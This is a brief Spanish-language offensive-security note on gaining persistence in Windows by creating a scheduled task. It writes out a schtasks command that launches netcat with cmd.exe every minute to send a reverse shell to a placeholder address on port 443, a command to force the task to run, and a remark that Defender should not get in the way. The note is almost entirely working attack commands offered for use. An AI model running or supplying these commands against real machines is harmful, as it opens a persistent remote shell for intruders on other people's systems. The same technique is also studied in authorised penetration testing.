---
tags: []
---
---
- tags: #windows #rce #persistencia #nc #netcat #tarea #schtasks
----

## Persistencia con tareas programadas

> Podemos utilizar el comando *schtasks* para crear tareas programadas en Windows y enviar con netcat un terminal.

```Comando de Windows
schtasks /create /tn "Hola Caracola" /tr "c:\windows\temp\nc.exe -e cmd.exe 192.168.x.x 443" /sc minute /mo 1
```

**(NOTA: SE REQUIERE HABER DESCARGADO NETCAT EN LA MÁQUINA (EL DEFENDER NO DEBERÍA DE DAR PROBLEMAS))**

> Podemos forzar la ejecución con:

```Comando 
schtasks /run /tn "Hola Caracola"
```







